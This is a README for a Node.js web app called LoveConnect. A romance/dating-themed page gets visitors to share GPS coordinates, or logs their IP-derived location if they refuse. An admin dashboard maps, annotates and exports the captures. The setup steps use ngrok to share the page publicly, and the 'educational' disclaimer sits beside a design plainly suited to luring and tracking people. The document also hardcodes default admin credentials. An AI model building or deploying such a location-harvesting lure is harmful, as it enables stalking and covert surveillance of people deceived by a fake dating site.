# 💖 LoveConnect Geolocation Tracker Demo

A complete, production-ready full-stack web application designed for educational demonstrations of GPS geolocation tracking, IP fallback architectures, and secure administrative command panels. 

This application features a highly styled, modern **romance/dating-themed landing page** to incentivize client verification, a robust **Node.js/Express API backend**, a persistent **SQLite database**, and a dark-themed **Secure Admin Control Panel** featuring interactive global map routing (via Leaflet.js) and capture statistics charts (via Chart.js).

---

## 🎯 Key Features

1. **Attractive Romance-Themed User Portal**:
   - Built using Tailwind CSS, featuring beautiful gradients, glowing animated widgets, and soft blur decorations.
   - Demands **explicit location consent** before querying coordinates.
   - Shows simulated real-time matched local user profiles once verified.
   
2. **Double-Ended IP Geolocation Fallback**:
   - If the visitor denies or has a browser that lacks GPS support, the client can fall back to IP-based Geolocation.
   - The backend runs a clean geolocation resolver (using the free `ip-api.com` service) to map coordinates from public IPs instantly.
   
3. **Interactive Admin Command Dashboard**:
   - Accessible via credentials at the `/admin` path.
   - **Real-time Live Polling**: Automatically fetches new logs every 5 seconds (can be toggled).
   - **Stats Panel**: Monitored Total Captures, Unique IPs, Today's Scans, and Last Scan.
   - **Interactive Leaflet Map**: Plot active pins on a dark vector map with live color-coding (Pink for real high-accuracy GPS, Purple for coarse IP fallbacks). Markers show logs and notes on hover/click.
   - **Chart.js Panel**: Displays dynamic visual ratios of GPS vs IP detections.
   - **Full Data Table**: Features paginated columns (10/25/50 rows), sorting headers, global word filtering, and inline notes annotation edits.
   - **Data Actions**: Single-click downloads for formatted **CSV exports** and one-key **Database Wipes** with multi-step validation.

4. **Security & Performance**:
   - **Rate Limiter**: Lightweight IP rate limiting limits flood requests to 30 actions/minute.
   - **Page Bypass Protections**: Express route guards intercept static file calls (e.g. `/admin.html` and `/login.html`) to prevent static files leaking without active session verification.
   - **Local SQLite Storage**: Complete local storage inside `./database/locations.db`, surviving server restarts.

---

## 📂 Project Directory Layout

```
loveconnect-tracker/
├── server.js                 # Express Application server & DB pipeline
├── package.json              # App package manifest
├── .env                      # Safe Environment variables
├── database/
│   └── locations.db          # persistent SQLite storage file (Auto-created)
├── public/
│   ├── index.html            # Public Dating landing page
│   ├── login.html            # Secure Admin gate entry
│   ├── admin.html            # Secured Admin Control Center
│   ├── css/
│   │   └── style.css         # Custom animations & overrides
│   └── js/
│       ├── app.js            # Frontend public mapping & matches
│       └── admin.js          # Control center map/chart/table scripting
└── README.md                 # Setup & Deployment Manual
```

---

## 🚀 Setup & Local Deployment

Follow these quick steps to launch the application locally.

### 1. Prerequisites
Ensure you have **Node.js** (v16.0.0 or higher) and **npm** installed on your workstation.

### 2. Installation
Extract the repository contents, enter the project directory, and install dependencies:
```bash
cd loveconnect-tracker
npm install
```

### 3. Environment Variables
Create or inspect the `.env` file in the root folder. You can configure custom listening ports and admin passwords:
```env
PORT=3000
SESSION_SECRET=loveconnect-ultra-secret-key-2026-xyz
ADMIN_USERNAME=admin
ADMIN_PASSWORD=SecurePass123
```

### 4. Running the App
To boot the application server:
```bash
# Production start
npm start

# Developer hot-reload start
npm run dev
```

The console will display:
```
======================================================
💖 LoveConnect Full-Stack Server Running Successfully!
📍 Local URL: http://localhost:3000
🔒 Admin Area: http://localhost:3000/admin
======================================================
```

---

## 🌐 Exposing Publicly via ngrok

To demonstrate global tracking or test on mobile handsets, you can expose the local server using **ngrok**.

### 1. Install ngrok globally
```bash
npm install -g ngrok
```
*(Alternatively, you can download the standalone binary from [ngrok.com](https://ngrok.com)).*

### 2. Expose Port 3000
With the server running in one terminal, open another terminal and execute:
```bash
ngrok http 3000
```

### 3. Share & Test
Copy the secure public forwarding URL (looks like `https://xxxx-xx-xx.ngrok-free.app`) and open it on your mobile phone or share it with testers globally. 
- Real GPS tracking prompts will request Geolocation.
- Accepting will record high-accuracy coordinates.
- Rejecting will activate the server IP lookup, mapping the network's router grid.

---

## 📊 API Documentation

The server exposes the following REST Endpoints:

### Public Endpoints

* **`GET /`**
  - **Purpose**: Serves the public HTML landing page.
  
* **`POST /api/locations`**
  - **Purpose**: Receives client coordinate packets and commits them to SQLite.
  - **Payload Format (JSON)**:
    ```json
    {
      "latitude": 40.7128,
      "longitude": -74.0060,
      "accuracy": 15,
      "is_gps": true,
      "notes": "Custom comments",
      "city": "New York",
      "country": "USA"
    }
    ```
  - **IP Geolocation Trigger**: If `latitude` and `longitude` are omitted (or null), the server captures the client IP from proxy/headers and attempts resolution through standard geolocation.

---

### Secure Admin Endpoints (Requires Active Session Cookie)

* **`GET /admin`**
  - **Purpose**: Checks sessions and serves the Admin Dashboard console page. Redirects to `/admin/login` on failure.

* **`GET /admin/login`**
  - **Purpose**: Serves the login page. Redirects to `/admin` if already verified.

* **`POST /api/auth`**
  - **Purpose**: Authenticates the administrator session.
  - **Payload Format (JSON)**:
    ```json
    {
      "username": "admin",
      "password": "SecurePass123"
    }
    ```
  - **Response**: Sets the `express-session` cookie active for 24 hours.

* **`GET /admin/logout`**
  - **Purpose**: Destroys the administrative session and redirects to `/admin/login`.

* **`GET /api/locations`**
  - **Purpose**: Fetches all logged coordinate objects sorted newest first.
  - **Response (JSON)**: Array of database objects.

* **`PUT /api/locations/:id/notes`**
  - **Purpose**: Appends/Updates administrative notes or annotations for a specified scan ID.
  - **Payload (JSON)**:
    ```json
    {
      "notes": "Follow-up contact made."
    }
    ```

* **`GET /api/locations/export`**
  - **Purpose**: Queries all locations and streams a properly escaped standard **CSV File** download.

* **`DELETE /api/locations`**
  - **Purpose**: Wipes all tables from the database.

---

## 🧪 Testing Locally

To completely test the application cycle locally on your machine:

1. **Verify Default Page**:
   - Visit `http://localhost:3000`.
   - Toggle the Location Consent checkmark.
   - Click "Discover Singles Near Me".
   - Grant permission on your browser popup.
   - Verify coordinates, accuracy, and timestamp are displayed. Swipe matches.

2. **Verify IP Geolocation Fallback**:
   - Click "Grant Permission & Try Again" but block/deny permission on the browser.
   - Or click "Use IP Geolocation (Fallback)" directly.
   - The server will execute IP georeferencing. Since you are testing on `localhost` (IP `127.0.0.1` or `::1`), the server automatically applies NYC coordinates (`40.7128`, `-74.0060`) as a fallback mockup to allow painless local debugging.

3. **Verify Dashboard Access**:
   - Navigate to `http://localhost:3000/admin`.
   - You should be automatically intercepted and redirected to `/admin/login`.
   - Enter `admin` and `SecurePass123`. Click "Authenticate".
   - You will land on the Control Center.
   - Verify that stats cards populate, the Leaflet Map centers and displays your test pins, and the Chart.js doughnut shows correct portions.
   - Edit a note on one of the rows, click "Save Note", and verify it updates in the table and on the map marker popup on hover.
   - Search for a city name or IP to test searching.
   - Test Sort triggers by clicking on table column headers.
   - Test CSV export by clicking "Export CSV" to download the file.

---

## 🛡️ Disclaimer

This application is designed **strictly for educational demonstration, penetration-testing validation, and research purposes**. Geolocation tracking is a sensitive permission. Ensure you only test this code in sandbox environments, and acquire explicit permissions from target users before running public tracking exercises.
